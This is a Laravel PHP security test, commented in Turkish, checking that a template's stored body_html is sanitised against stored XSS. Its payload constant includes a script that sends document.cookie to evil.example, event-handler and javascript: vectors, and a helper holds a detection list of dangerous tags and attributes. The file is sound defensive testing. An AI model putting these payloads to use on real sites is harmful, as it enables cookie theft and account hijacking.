<?php

namespace Tests\Feature\Security;

use App\Models\EmailTemplate;
use App\Models\User;
use App\Services\Settings\EmailTemplateService;
use Database\Seeders\RolePermissionSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/**
 * Faz 13 / İz A5.3 (§4-F5, §7-H6) — e-posta şablonu `body_html` stored-XSS
 * regresyonu.
 *
 * =============================================================================
 * NE DOĞRULANIYOR: YANIT DEĞİL, KALICI VERİ
 * =============================================================================
 * İddialar HTTP yanıtı üzerinden değil `email_templates` tablosundaki DEĞER
 * üzerinden kuruluyor. Gerekçe: stored XSS'in tanımı, zararlı yükün KALICI
 * OLMASI ve sonradan BAŞKA bir bağlamda render edilmesidir. Yanıtı temizleyip
 * DB'ye kirli yazan bir uygulama bu testin yanıt tabanlı sürümünü geçer ama
 * gerçek açığı taşımaya devam eder — ilk gerçek e-posta gönderimi ya da
 * daha düşük yetkili bir önizleyici eklendiğinde patlar.
 *
 * Bugünkü patlama yarıçapı DÜŞÜK (yalnız `settings.manage` yazabilir/görebilir,
 * `MAIL_MAILER=log` ile gönderim yok) — bu test tam olarak o yarıçap büyüdüğünde
 * sessizce açık kalmasın diye var.
 *
 * KAPSAM: HTTP uçları (Store/Update FormRequest katmanı) VE servisin doğrudan
 * çağrılması (seeder/konsol gibi HTTP dışı yollar). İkisi ayrı katman; birinin
 * yeterli sanılması bu düzeltmenin en olası gerileme biçimi.
 */
class EmailTemplateXssTest extends TestCase
{
    use RefreshDatabase;

    /**
     * Tek bir istekte bir arada gönderilen saldırı yükleri. `assertClean()`
     * hepsinin kalıcı değerden düştüğünü doğrular.
     */
    private const PAYLOAD = '<p>Merhaba {{ musteri_adi }}</p>'
        .'<script>fetch("https://evil.example/?c="+document.cookie)</script>'
        .'<img src=x onerror="alert(1)">'
        .'<a href="javascript:alert(1)">tıkla</a>'
        .'<a href="JaVaScRiPt:alert(1)">tıkla</a>'
        .'<iframe src="https://evil.example/"></iframe>'
        .'<svg onload="alert(1)"></svg>'
        .'<style>body{background:url(javascript:alert(1))}</style>'
        .'<form action="https://evil.example/"><input name="pw"></form>'
        .'<base href="https://evil.example/">'
        .'<div onmouseover="alert(1)">Şirket: Öztürk Işık A.Ş.</div>';

    protected function setUp(): void
    {
        parent::setUp();

        $this->seed(RolePermissionSeeder::class);
    }

    private function manager(): User
    {
        $user = User::factory()->create();
        $user->givePermissionTo('settings.manage');

        return $user;
    }

    // -------------------------------------------------------------------
    // HTTP uçları
    // -------------------------------------------------------------------

    public function test_store_persists_a_sanitized_body(): void
    {
        $this->actingAs($this->manager())
            ->postJson('/api/settings/email-templates', [
                'key' => 'xss_denemesi',
                'name' => 'XSS Denemesi',
                'subject' => 'Konu',
                'body_html' => self::PAYLOAD,
            ])
            ->assertStatus(201);

        $stored = (string) EmailTemplate::query()->where('key', 'xss_denemesi')->value('body_html');

        $this->assertClean($stored);

        // Zararsız kısım hayatta kalmalı — sanitizasyon "her şeyi sil" değil.
        $this->assertStringContainsString('Merhaba {{ musteri_adi }}', $stored);
        $this->assertStringContainsString('Şirket: Öztürk Işık A.Ş.', $stored);
    }

    public function test_update_persists_a_sanitized_body(): void
    {
        $template = EmailTemplate::factory()->create(['key' => 'guncellenecek']);

        $this->actingAs($this->manager())
            ->patchJson("/api/settings/email-templates/{$template->id}", [
                'body_html' => self::PAYLOAD,
            ])
            ->assertStatus(200);

        $this->assertClean((string) $template->refresh()->body_html);
    }

    /**
     * Gövdesi TAMAMEN yükten ibaretse sanitizasyondan sonra hiçbir şey kalmaz.
     * Bu isteğin sonucu SESSİZ BİR BOŞ ŞABLON değil, dürüst bir 422 olmalı —
     * sanitizasyon doğrulamadan ÖNCE çalıştığı için `required` temizlenmiş
     * değeri görür (bkz. StoreEmailTemplateRequest::prepareForValidation).
     */
    public function test_body_that_is_entirely_payload_is_rejected_not_silently_emptied(): void
    {
        $this->actingAs($this->manager())
            ->postJson('/api/settings/email-templates', [
                'key' => 'tamamen_yuk',
                'name' => 'Tamamen Yük',
                'subject' => 'Konu',
                'body_html' => '<script>alert(1)</script>',
            ])
            ->assertStatus(422)
            // Hata zarfı bu projede `errors.fields` altında (bkz. SettingsApiTest).
            ->assertJsonPath('errors.code', 'VALIDATION_ERROR')
            ->assertJsonStructure(['errors' => ['fields' => ['body_html']]]);

        $this->assertDatabaseMissing('email_templates', ['key' => 'tamamen_yuk']);
    }

    /**
     * `variables` gönderilmediğinde servis onu gövdeden türetiyor. Türetme
     * SANİTİZE EDİLMİŞ metin üzerinden yapılmalı: yalnız `<script>` içinde
     * geçen bir yer tutucu, gövdede artık bulunmayan bir değişkeni listeye
     * yazardı ve önizleme ekranı olmayan bir alanı sorardı.
     */
    public function test_variables_are_derived_from_the_sanitized_body_only(): void
    {
        $this->actingAs($this->manager())
            ->postJson('/api/settings/email-templates', [
                'key' => 'degisken_turetme',
                'name' => 'Değişken Türetme',
                'subject' => 'Konu',
                'body_html' => '<p>{{ gercek_degisken }}</p><script>{{ hayalet_degisken }}</script>',
            ])
            ->assertStatus(201);

        /** @var array<int, string> $variables */
        $variables = EmailTemplate::query()->where('key', 'degisken_turetme')->value('variables');

        $this->assertContains('gercek_degisken', $variables);
        $this->assertNotContains('hayalet_degisken', $variables);
    }

    /**
     * Zaten temiz bir gövde HTTP'den geçtiğinde AYNEN kalmalı. Aksi hâlde
     * mevcut şablonlar her düzenlemede sessizce aşınırdı (FormRequest +
     * servis çift sanitizasyonu bu yüzden idempotent olmak zorunda).
     */
    public function test_already_clean_body_is_untouched(): void
    {
        $clean = '<p>Sayın <strong>{{ musteri_adi }}</strong>,</p>'
            .'<p>Teklifiniz <a href="https://syncra.example/teklif">burada</a>.</p>';

        $this->actingAs($this->manager())
            ->postJson('/api/settings/email-templates', [
                'key' => 'temiz_govde',
                'name' => 'Temiz Gövde',
                'subject' => 'Konu',
                'body_html' => $clean,
            ])
            ->assertStatus(201);

        $this->assertSame(
            $clean,
            (string) EmailTemplate::query()->where('key', 'temiz_govde')->value('body_html')
        );
    }

    // -------------------------------------------------------------------
    // HTTP DIŞI yol — seeder / konsol / ileride import
    // -------------------------------------------------------------------

    /**
     * FormRequest tek savunma katmanı OLAMAZ: servisi doğrudan çağıran hiçbir
     * yol HTTP doğrulamasını görmez.
     */
    public function test_service_sanitizes_even_without_the_http_layer(): void
    {
        $service = app(EmailTemplateService::class);

        $created = $service->create([
            'key' => 'servis_dogrudan',
            'name' => 'Servis Doğrudan',
            'subject' => 'Konu',
            'body_html' => self::PAYLOAD,
        ]);

        $this->assertClean((string) $created->fresh()->body_html);

        $updated = $service->update($created, ['body_html' => self::PAYLOAD]);

        $this->assertClean((string) $updated->fresh()->body_html);
    }

    // -------------------------------------------------------------------
    // Ortak iddia
    // -------------------------------------------------------------------

    /**
     * KALICI değerin çalıştırılabilir hiçbir şey taşımadığını doğrular.
     *
     * `javascript:` kontrolü, tarayıcının URL okuyuşunu taklit ederek TÜM
     * boşluk/kontrol karakterleri atıldıktan SONRA yapılır — `java\tscript:`
     * gibi vektörler tam da bu adım atlandığı için kaçar. Ayrıntılı,
     * DOM tabanlı invaryant kontrolü Tests\Unit\HtmlSanitizerTest'te;
     * burada regresyonun kalıcı veride görünen yüzü sabitleniyor.
     */
    private function assertClean(string $stored): void
    {
        $collapsed = strtolower((string) preg_replace('/[\x00-\x20\x7F]/', '', $stored));

        foreach (['javascript:', 'vbscript:', 'data:text/html'] as $scheme) {
            $this->assertStringNotContainsString($scheme, $collapsed, "Kalıcı gövdede `$scheme` var: $stored");
        }

        foreach (['<script', '<iframe', '<style', '<form', '<input', '<base', '<svg', '<object', '<embed'] as $tag) {
            $this->assertStringNotContainsString($tag, $collapsed, "Kalıcı gövdede `$tag` var: $stored");
        }

        foreach (['onerror', 'onload', 'onmouseover', 'onclick', 'style='] as $attribute) {
            $this->assertStringNotContainsString($attribute, $collapsed, "Kalıcı gövdede `$attribute` var: $stored");
        }

        $this->assertTrue(mb_check_encoding($stored, 'UTF-8'), 'Kalıcı gövde geçerli UTF-8 değil.');
    }
}
